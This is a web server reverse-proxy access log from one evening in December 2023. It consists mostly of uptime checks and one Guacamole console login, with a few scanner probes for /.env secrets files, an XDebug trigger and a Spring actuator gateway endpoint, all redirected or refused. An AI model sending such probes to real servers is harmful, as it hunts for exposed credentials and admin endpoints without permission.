143.110.222.166 - - [20/Dec/2023:19:15:26 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2598 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:19:15:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2599 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:16:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2600 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:16:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2601 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:17:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2602 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:17:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2603 "www@docker" "http://172.20.0.9:80" 0ms
57.129.23.166 - - [20/Dec/2023:19:17:57 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2604 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [20/Dec/2023:19:17:58 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2605 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:19:18:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2606 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:19:18:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2607 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:19:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2608 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:19:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2609 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:19:20:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2610 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:19:20:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2611 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:21:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2612 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:21:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2613 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:22:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2614 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:22:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2615 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:19:23:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2616 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:19:23:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2617 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:19:24:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2618 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:24:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2619 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:19:25:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2620 "www@docker" "http://172.20.0.9:80" 0ms
54.36.115.221 - - [20/Dec/2023:19:25:19 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2621 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [20/Dec/2023:19:25:19 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2622 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:19:25:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2623 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:19:26:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2624 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:26:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2625 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:27:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2626 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:27:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2627 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:28:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2628 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:28:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2629 "www@docker" "http://172.20.0.9:80" 0ms
91.242.151.97 - - [20/Dec/2023:19:29:02 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2630 "web-to-websecure@internal" "-" 0ms
50.205.119.150 - - [20/Dec/2023:19:29:04 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2631 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:19:29:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2632 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:29:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2633 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:19:30:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2634 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:30:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2635 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:31:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2636 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:31:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2637 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:32:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2638 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:32:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2639 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:19:33:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2640 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:33:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2641 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:34:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2642 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:34:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2643 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:19:35:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2644 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:35:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2645 "www@docker" "http://172.20.0.9:80" 0ms
83.97.73.87 - - [20/Dec/2023:19:35:34 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 17 "-" "-" 2646 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [20/Dec/2023:19:35:35 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 2647 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:19:36:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2648 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:36:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2649 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:37:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2650 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:37:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2651 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:19:38:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2652 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:19:38:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2653 "www@docker" "http://172.20.0.9:80" 1ms
172.104.166.147 - - [20/Dec/2023:19:38:56 +0000] "GET /EVgZ HTTP/1.1" 301 17 "-" "-" 2654 "web-to-websecure@internal" "-" 0ms
172.104.166.147 - - [20/Dec/2023:19:38:56 +0000] "GET /gArC HTTP/1.1" 301 17 "-" "-" 2655 "web-to-websecure@internal" "-" 0ms
139.162.45.221 - - [20/Dec/2023:19:39:11 +0000] "GET /7dzG HTTP/1.1" 404 19 "-" "-" 2656 "-" "-" 0ms
139.162.45.221 - - [20/Dec/2023:19:39:12 +0000] "GET /WTbP HTTP/1.1" 404 19 "-" "-" 2657 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:19:39:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2658 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:39:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2659 "www@docker" "http://172.20.0.9:80" 0ms
129.55.200.20 - - [20/Dec/2023:19:39:52 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2011 "-" "-" 2660 "logpager@docker" "http://172.20.0.3:80" 3ms
129.55.200.20 - - [20/Dec/2023:19:40:08 +0000] "GET /guacamole/ HTTP/2.0" 200 2811 "-" "-" 2661 "guacamole@docker" "http://172.20.0.11:8080" 450ms
129.55.200.20 - - [20/Dec/2023:19:40:08 +0000] "GET /guacamole/1.guacamole.1b135b054a2260e7b072.css HTTP/2.0" 200 79918 "-" "-" 2662 "guacamole@docker" "http://172.20.0.11:8080" 36ms
129.55.200.20 - - [20/Dec/2023:19:40:08 +0000] "GET /guacamole/Blob.js HTTP/2.0" 200 20299 "-" "-" 2664 "guacamole@docker" "http://172.20.0.11:8080" 48ms
129.55.200.20 - - [20/Dec/2023:19:40:08 +0000] "GET /guacamole/1.guacamole.7935cf403412cd79c600.js HTTP/2.0" 200 16587 "-" "-" 2670 "guacamole@docker" "http://172.20.0.11:8080" 54ms
129.55.200.20 - - [20/Dec/2023:19:40:08 +0000] "GET /guacamole/datalist-polyfill.min.js HTTP/2.0" 200 7428 "-" "-" 2665 "guacamole@docker" "http://172.20.0.11:8080" 59ms
129.55.200.20 - - [20/Dec/2023:19:40:08 +0000] "GET /guacamole/guacamole-common-js/all.min.js HTTP/2.0" 200 72454 "-" "-" 2666 "guacamole@docker" "http://172.20.0.11:8080" 100ms
129.55.200.20 - - [20/Dec/2023:19:40:08 +0000] "GET /guacamole/angular.min.js HTTP/2.0" 200 177368 "-" "-" 2669 "guacamole@docker" "http://172.20.0.11:8080" 101ms
129.55.200.20 - - [20/Dec/2023:19:40:08 +0000] "GET /guacamole/jquery.min.js HTTP/2.0" 200 89795 "-" "-" 2667 "guacamole@docker" "http://172.20.0.11:8080" 115ms
129.55.200.20 - - [20/Dec/2023:19:40:08 +0000] "GET /guacamole/lodash.min.js HTTP/2.0" 200 73015 "-" "-" 2668 "guacamole@docker" "http://172.20.0.11:8080" 116ms
129.55.200.20 - - [20/Dec/2023:19:40:08 +0000] "GET /guacamole/templates.js HTTP/2.0" 200 97677 "-" "-" 2672 "guacamole@docker" "http://172.20.0.11:8080" 115ms
129.55.200.20 - - [20/Dec/2023:19:40:08 +0000] "GET /guacamole/guacamole.c99aa30d916181eec243.js HTTP/2.0" 200 369103 "-" "-" 2671 "guacamole@docker" "http://172.20.0.11:8080" 140ms
129.55.200.20 - - [20/Dec/2023:19:40:08 +0000] "GET /guacamole/app.js?b=20230726134908 HTTP/2.0" 200 6482 "-" "-" 2673 "guacamole@docker" "http://172.20.0.11:8080" 150ms
129.55.200.20 - - [20/Dec/2023:19:40:08 +0000] "GET /guacamole/app.css?b=20230726134908 HTTP/2.0" 200 1987 "-" "-" 2663 "guacamole@docker" "http://172.20.0.11:8080" 161ms
129.55.200.20 - - [20/Dec/2023:19:40:09 +0000] "GET /guacamole/images/logo-64.png HTTP/2.0" 200 5082 "-" "-" 2677 "guacamole@docker" "http://172.20.0.11:8080" 10ms
129.55.200.20 - - [20/Dec/2023:19:40:09 +0000] "GET /guacamole/api/languages HTTP/2.0" 200 244 "-" "-" 2674 "guacamole@docker" "http://172.20.0.11:8080" 532ms
129.55.200.20 - - [20/Dec/2023:19:40:09 +0000] "GET /guacamole/api/patches HTTP/2.0" 200 340 "-" "-" 2675 "guacamole@docker" "http://172.20.0.11:8080" 533ms
129.55.200.20 - - [20/Dec/2023:19:40:09 +0000] "GET /guacamole/translations/en.json HTTP/2.0" 200 49963 "-" "-" 2678 "guacamole@docker" "http://172.20.0.11:8080" 5ms
129.55.200.20 - - [20/Dec/2023:19:40:09 +0000] "POST /guacamole/api/tokens HTTP/2.0" 403 257 "-" "-" 2676 "guacamole@docker" "http://172.20.0.11:8080" 2631ms
129.55.200.20 - - [20/Dec/2023:19:40:11 +0000] "GET /guacamole/images/guac-tricolor.svg HTTP/2.0" 200 3788 "-" "-" 2679 "guacamole@docker" "http://172.20.0.11:8080" 5ms
129.55.200.20 - - [20/Dec/2023:19:40:11 +0000] "GET /guacamole/fonts/carlito/Carlito-Italic.woff HTTP/2.0" 200 283500 "-" "-" 2682 "guacamole@docker" "http://172.20.0.11:8080" 28ms
129.55.200.20 - - [20/Dec/2023:19:40:11 +0000] "GET /guacamole/fonts/carlito/Carlito-Regular.woff HTTP/2.0" 200 269832 "-" "-" 2680 "guacamole@docker" "http://172.20.0.11:8080" 30ms
129.55.200.20 - - [20/Dec/2023:19:40:11 +0000] "GET /guacamole/fonts/carlito/Carlito-Bold.woff HTTP/2.0" 200 281212 "-" "-" 2681 "guacamole@docker" "http://172.20.0.11:8080" 31ms
129.55.200.20 - - [20/Dec/2023:19:40:14 +0000] "POST /guacamole/api/tokens HTTP/2.0" 403 261 "-" "-" 2683 "guacamole@docker" "http://172.20.0.11:8080" 256ms
129.55.200.20 - - [20/Dec/2023:19:40:16 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2684 "guacamole@docker" "http://172.20.0.11:8080" 130ms
129.55.200.20 - - [20/Dec/2023:19:40:16 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2685 "guacamole@docker" "http://172.20.0.11:8080" 9ms
129.55.200.20 - - [20/Dec/2023:19:40:16 +0000] "GET /guacamole/api/session/data/mysql-shared/self/effectivePermissions HTTP/2.0" 200 228 "-" "-" 2689 "guacamole@docker" "http://172.20.0.11:8080" 197ms
129.55.200.20 - - [20/Dec/2023:19:40:16 +0000] "GET /guacamole/api/session/data/mysql-shared/connectionGroups/ROOT/tree HTTP/2.0" 200 123 "-" "-" 2687 "guacamole@docker" "http://172.20.0.11:8080" 223ms
129.55.200.20 - - [20/Dec/2023:19:40:16 +0000] "GET /guacamole/api/session/data/mysql/self/effectivePermissions HTTP/2.0" 200 685 "-" "-" 2688 "guacamole@docker" "http://172.20.0.11:8080" 573ms
129.55.200.20 - - [20/Dec/2023:19:40:16 +0000] "GET /guacamole/api/session/data/mysql/connectionGroups/ROOT/tree HTTP/2.0" 200 1632 "-" "-" 2686 "guacamole@docker" "http://172.20.0.11:8080" 608ms
129.55.200.20 - - [20/Dec/2023:19:40:16 +0000] "GET /guacamole/images/user-icons/guac-user.svg HTTP/2.0" 200 655 "-" "-" 2694 "guacamole@docker" "http://172.20.0.11:8080" 1ms
129.55.200.20 - - [20/Dec/2023:19:40:16 +0000] "GET /guacamole/images/x.svg HTTP/2.0" 200 441 "-" "-" 2693 "guacamole@docker" "http://172.20.0.11:8080" 4ms
129.55.200.20 - - [20/Dec/2023:19:40:17 +0000] "GET /guacamole/images/magnifier.svg HTTP/2.0" 200 647 "-" "-" 2699 "guacamole@docker" "http://172.20.0.11:8080" 5ms
129.55.200.20 - - [20/Dec/2023:19:40:17 +0000] "GET /guacamole/images/protocol-icons/guac-text.svg HTTP/2.0" 200 647 "-" "-" 2700 "guacamole@docker" "http://172.20.0.11:8080" 6ms
129.55.200.20 - - [20/Dec/2023:19:40:17 +0000] "GET /guacamole/images/action-icons/guac-logout-dark.svg HTTP/2.0" 200 1464 "-" "-" 2698 "guacamole@docker" "http://172.20.0.11:8080" 7ms
129.55.200.20 - - [20/Dec/2023:19:40:17 +0000] "GET /guacamole/images/protocol-icons/guac-monitor.svg HTTP/2.0" 200 968 "-" "-" 2701 "guacamole@docker" "http://172.20.0.11:8080" 7ms
129.55.200.20 - - [20/Dec/2023:19:40:17 +0000] "GET /guacamole/images/arrows/down.svg HTTP/2.0" 200 317 "-" "-" 2695 "guacamole@docker" "http://172.20.0.11:8080" 9ms
129.55.200.20 - - [20/Dec/2023:19:40:17 +0000] "GET /guacamole/images/action-icons/guac-config-dark.svg HTTP/2.0" 200 840 "-" "-" 2697 "guacamole@docker" "http://172.20.0.11:8080" 9ms
129.55.200.20 - - [20/Dec/2023:19:40:17 +0000] "GET /guacamole/images/action-icons/guac-home-dark.svg HTTP/2.0" 200 505 "-" "-" 2696 "guacamole@docker" "http://172.20.0.11:8080" 12ms
129.55.200.20 - - [20/Dec/2023:19:40:16 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 2692 "guacamole@docker" "http://172.20.0.11:8080" 40ms
129.55.200.20 - - [20/Dec/2023:19:40:16 +0000] "GET /guacamole/api/session/data/mysql/users/jonathan HTTP/2.0" 200 409 "-" "-" 2690 "guacamole@docker" "http://172.20.0.11:8080" 228ms
129.55.200.20 - - [20/Dec/2023:19:40:16 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 2691 "guacamole@docker" "http://172.20.0.11:8080" 222ms
159.203.109.206 - - [20/Dec/2023:19:40:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2702 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:40:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2703 "www@docker" "http://172.20.0.9:80" 0ms
198.235.24.167 - - [20/Dec/2023:19:40:37 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2704 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:19:41:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2705 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:41:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2706 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:42:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2707 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:42:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2708 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:43:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2709 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:43:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2710 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:44:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2711 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:44:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2712 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:45:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2713 "www@docker" "http://172.20.0.9:80" 0ms
205.210.31.44 - - [20/Dec/2023:19:45:33 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2714 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:19:45:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2715 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:46:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2716 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:46:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2717 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:19:47:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2718 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:47:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2719 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:19:48:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2720 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:48:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2721 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:49:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2722 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:49:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2723 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:19:50:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2724 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:19:50:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2725 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:51:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2726 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:51:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2727 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:19:52:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2728 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:19:52:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2729 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:53:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2730 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:53:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2731 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:54:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2732 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:54:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2733 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:55:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2734 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:55:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2735 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:56:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2736 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:56:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2737 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:19:57:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2738 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:57:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2739 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:58:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2740 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:58:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2741 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:19:59:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2742 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:19:59:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2743 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:00:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2744 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:00:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2745 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:20:01:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2746 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:01:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2747 "www@docker" "http://172.20.0.9:80" 1ms
143.110.222.166 - - [20/Dec/2023:20:01:34 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2748 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:20:02:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2749 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:02:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2750 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:03:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2751 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:03:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2752 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:04:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2753 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:04:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2754 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:05:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2755 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:05:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2756 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:06:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2757 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:06:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2758 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:20:07:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2759 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:20:07:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2760 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:08:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2761 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:08:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2762 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:09:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2763 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:09:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2764 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:10:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2765 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:10:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2766 "www@docker" "http://172.20.0.9:80" 1ms
83.97.73.87 - - [20/Dec/2023:20:11:09 +0000] "GET /actuator/gateway/routes HTTP/1.1" 301 17 "-" "-" 2767 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [20/Dec/2023:20:11:10 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 2768 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:20:11:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2769 "www@docker" "http://172.20.0.9:80" 1ms
